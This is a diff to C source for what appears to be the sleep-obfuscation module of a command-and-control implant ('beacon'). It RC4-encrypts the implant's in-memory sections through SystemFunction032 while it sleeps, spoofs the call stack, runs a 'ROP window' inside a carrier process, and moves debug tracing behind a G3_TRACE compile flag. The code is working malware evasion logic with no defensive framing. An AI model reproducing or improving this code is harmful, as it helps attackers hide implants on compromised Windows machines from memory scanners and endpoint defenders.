@@ -29,16 +29,19 @@ typedef struct _G3_USTRING {
 
 typedef LONG(NTAPI *G3_SF032)(G3_USTRING * data, G3_USTRING * key); /* advapi32 SystemFunction032 = RtlEncryptDecryptRC4, returns NTSTATUS (LONG) */
 
-/* ---- temporary bisect probe (remove after diagnosis) ----
+/* ---- tracing probes (rounds 12-17), compiled out unless G3_TRACE ----
  *
- * Round 12 root cause: g3_log("ROP window served") ran BETWEEN mask and
- * unmask, so its CreateFileA went through the .rdata IAT - ciphertext.
- * RVA proof: crash insn 0x150CA -> thunk slot 0x312F0 = kernel32!
- * CreateFileA, the only CreateFileA caller in the image is g3_log.
- * Fix: every file op used anywhere inside the window goes through G3_IO -
- * kernel32 pointers + path copied ONCE at init, carried on the stack via
- * G3_MASKCTX. g3_log (string form) stays for outside-window lines and
- * falls back to direct calls when init has not populated the cache. */
+ * Round 12 lesson baked into the design: any logging inside the masked
+ * window must go through G3_IO - kernel32 pointers + path copied ONCE at
+ * init, carried on the stack via G3_MASKCTX (the round-12 crash was
+ * g3_log's CreateFileA through the ciphertext .rdata IAT). g3_log
+ * (string form) is for outside-window lines only.
+ *
+ * Default build: G3_TRACE undefined -> g3_log is a header macro no-op and
+ * g3_log_n/g3_chk are no-op macros below; the whole file-IO layer and the
+ * mctx.io field disappear at preprocessing. */
+
+#if defined(G3_TRACE)
 
 typedef struct {
 	HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
@@ -148,6 +151,13 @@ static unsigned long long g3_chk(const unsigned char * p, unsigned long len)
 	return h;
 }
 
+#else /* !G3_TRACE */
+
+#define g3_log_n(a, b, c, d, e) ((void)0)
+#define g3_chk(p, l) 0ULL
+
+#endif /* G3_TRACE */
+
 static G3_SF032 g_sf032;
 
 /* RC4 is a stream cipher: running it twice with the same key restores the
@@ -199,10 +209,12 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 	g3_log("snap: beacon_ptr", (long)(long long)parms.beacon_ptr);
 	g3_log("snap: sections", (long)(long long)parms.sections);
 	g3_log("snap: hr", (long)(long long)hr);
+#if defined(G3_TRACE)
 	{
 		DWORD lf = *(DWORD *)((unsigned char *)parms.beacon_ptr + 0x3C);
 		g3_log("snap: lfanew", (long)lf);
 	}
+#endif
 
 	/* The mask engine (this code) lives in beacon .text: an in-place
 	 * encrypt of .text would encrypt our own return path mid-call. The
@@ -446,6 +458,7 @@ static BOOL g3_init(void)
 	g_lookup = (G3_LOOKUP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLookupFunctionEntry");
 	if (g_lookup == NULL) { g3_log("init: no RtlLookupFunctionEntry", 0); return FALSE; }
 
+#if defined(G3_TRACE)
 	/* trace IO cache - filled once, used by every logger (also inside the
 	 * masked window, via the G3_MASKCTX copy) */
 	{
@@ -462,6 +475,7 @@ static BOOL g3_init(void)
 		*dst = 0;
 		g_io.ok = (g_io.pCreateFileA != NULL && g_io.pWriteFile != NULL && g_io.pCloseHandle != NULL && g_sf032 != NULL);
 	}
+#endif
 
 	/* resolve every frame's return address; localspl is not loaded in the
 	 * average carrier process, so pull it in once (the module-load event
@@ -653,7 +667,9 @@ typedef struct {
 	int nblocks;
 	unsigned char key[16];
 	G3_SF032 fn; /* cached pre-mask: .data (holding g_sf032) is ciphertext until unmask completes */
+#if defined(G3_TRACE)
 	G3_IO io;    /* cached pre-mask: trace file ops must not go through the IAT */
+#endif
 } G3_MASKCTX;
 
 static void g3_mask_all_cb(void * vctx)
@@ -707,7 +723,9 @@ BOOL gen3_sleep(DWORD time)
 	for (i = 0; i < 16; i++)
 		mctx.key[i] = key[i];
 	mctx.fn = g_sf032;
+#if defined(G3_TRACE)
 	mctx.io = g_io; /* struct copy pre-mask; the window uses only this copy */
+#endif
 
 	/* block map + plaintext checksums (C is what every later phase must
 	 * reproduce: 'm' must differ, 'U' must equal 'C') */
@@ -715,6 +733,7 @@ BOOL gen3_sleep(DWORD time)
 		g3_log_n(&mctx.io, 'B', (unsigned int)i, (unsigned long long)(size_t)blocks[i].ptr, blocks[i].len);
 		g3_log_n(&mctx.io, 'C', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
 	}
+#if defined(G3_TRACE)
 	{
 		unsigned long long k0 = 0, k1 = 0;
 		for (i = 0; i < 8; i++) {
@@ -724,6 +743,7 @@ BOOL gen3_sleep(DWORD time)
 		g3_log_n(&mctx.io, 'K', 0, k0, k1);
 		g3_log_n(&mctx.io, 'F', 0, (unsigned long long)(size_t)mctx.fn, (unsigned long long)nblocks);
 	}
+#endif
 
 	if (!g3_stack_spoof_sleep(time, g3_mask_all_cb, &mctx)) {
 		g3_log("sleep: window failed -> fallback", 0x7fffffff);
